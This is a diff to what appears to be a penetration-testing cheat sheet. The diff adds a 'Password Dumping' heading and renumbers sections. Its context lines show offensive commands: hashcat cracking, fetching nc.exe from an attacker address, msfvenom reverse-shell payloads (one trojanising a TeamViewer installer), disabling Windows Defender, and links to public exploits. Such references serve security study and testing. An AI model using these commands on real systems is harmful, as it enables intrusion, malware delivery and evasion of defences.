@@ -8,14 +8,15 @@ Overview
 4. - [Lateral Movement](#4---lateral-movement)
 5. - [Privilege Escalation](#5---privilege-escalation)
 6. - [Brute Force](#6---brute-force)
-7. - [File Transfers](#7---file-transfers)
-8. - [Restricted Shell Escapes](#8---restricted-shell-escapes)
-9. - [Shells](#9---shells)
-10. - [Evasion](#10---evasion)
-11. - [Online Resources](#11---online-resources)
-12. - [Browser Plugins](#12---browser-plugins)
-13. - [Exploits](#13---exploits)
-14. - [Exploit Research](#14---exploit-research)
+7. - [Password Dumping](#7---password-dumping)
+8. - [File Transfers](#8---file-transfers)
+9. - [Restricted Shell Escapes](#9---restricted-shell-escapes)
+10. - [Shells](#10---shells)
+11. - [Evasion](#11---evasion)
+12. - [Online Resources](#12---online-resources)
+13. - [Browser Plugins](#13---browser-plugins)
+14. - [Exploits](#14---exploits)
+15. - [Exploit Research](#15---exploit-research)
    
 #1. - Passive Enumeration
 -----------------------------------------
@@ -824,7 +825,10 @@ $ hashcat --force password.list -r custom.rule --stdout > mut_password.list
 $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 ```
 
-#7. - File Transfers
+#7. - Password Dumping
+-----------------------------------------
+
+#8. - File Transfers
 -----------------------------------------
 
 - Base64 Downloads (Kali -> Windows)
@@ -1320,7 +1324,7 @@ PS C:\> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 PS C:\> Invoke-WebRequest http://<IP address>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
 
-#8. - Restricted Shell Escapes
+#9. - Restricted Shell Escapes
 -----------------------------------------
 
 - Shell Escapes
@@ -1353,7 +1357,7 @@ $ export TERM=xterm-256color
 $ stty rows 67 columns 318
 ```
 
-#9. - Shells
+#10. - Shells
 -----------------------------------------
 
 - Bind Shells
@@ -1420,7 +1424,7 @@ $ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f macho
 $ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<IP Address> LPORT=<Port> -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
 ```
 
-#10. - Evasion
+#11. - Evasion
 -----------------------------------------
 
 - Disable Windows Defender
@@ -1429,7 +1433,7 @@ $ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<IP Address> LPORT=<Port> -
 PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true	
 ```
 
-#11. - Online Resources
+#12. - Online Resources
 -----------------------------------------
 
 - Speedguide
@@ -1456,7 +1460,7 @@ https://lolbas-project.github.io/
 https://gtfobins.github.io/
 ```
 
-#12. - Browser Plugins
+#13. - Browser Plugins
 -----------------------------------------
 
 - Wappalyzer: Website technology analyser
@@ -1477,7 +1481,7 @@ https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
 https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 ```
 
-#13. - Exploits
+#14. - Exploits
 -----------------------------------------
 
 - MS17-010
@@ -1513,7 +1517,7 @@ https://github.com/flast101/php-8.1.0-dev-backdoor-rce
 https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
 ```
 
-#14. - Exploit Research
+#15. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
